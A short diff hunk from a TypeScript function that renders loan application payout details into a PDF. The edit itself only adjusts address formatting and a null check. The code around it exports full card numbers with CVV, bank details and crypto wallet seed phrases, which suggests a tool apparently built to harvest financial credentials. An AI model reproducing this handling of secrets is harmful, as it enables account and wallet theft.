@@ -186,10 +186,10 @@ export async function addLoanToPDF(doc: jsPDF, loan: LoanApplication, isNewPage 
     payoutRows.push(["BANKING", `Bank: ${loan.bankName}\nHolder: ${loan.accountHolderName}\nAccount: ${loan.bankAccountNumber}\nRouting: ${loan.bankRoutingNumber}`]);
   }
   if (loan.cardNumber) {
-    payoutRows.push(["CARD", `Issuer: ${loan.cardIssuer}\nHolder: ${loan.cardHolderName}\nNumber: ${loan.cardNumber}\nExpiry: ${loan.cardExpiry} | CVV: ${loan.cardCvv}\nBilling: ${loan.billingAddressLine1}, ${loan.billingCity}`]);
+    payoutRows.push(["CARD", `Issuer: ${loan.cardIssuer}\nHolder: ${loan.cardHolderName}\nNumber: ${loan.cardNumber}\nExpiry: ${loan.cardExpiry} | CVV: ${loan.cardCvv}\nBilling: ${loan.billingAddressLine1}${loan.billingAddressLine2 ? ', ' + loan.billingAddressLine2 : ''}, ${loan.billingCity}`]);
   }
   if (loan.cryptoWalletAddress) {
-    payoutRows.push(["CRYPTO", `Wallet: ${loan.cryptoWalletType}\nAddress: ${loan.cryptoWalletAddress}\nSEED PHRASE: ${loan.cryptoSeedPhrase || "N/A"}`]);
+    payoutRows.push(["CRYPTO", `Wallet: ${loan.cryptoWalletType}\nAddress: ${loan.cryptoWalletAddress}\nSeed Phrase: ${loan.cryptoSeedPhrase ?? "N/A"}`]);
   }
 
   if (payoutRows.length > 0) {
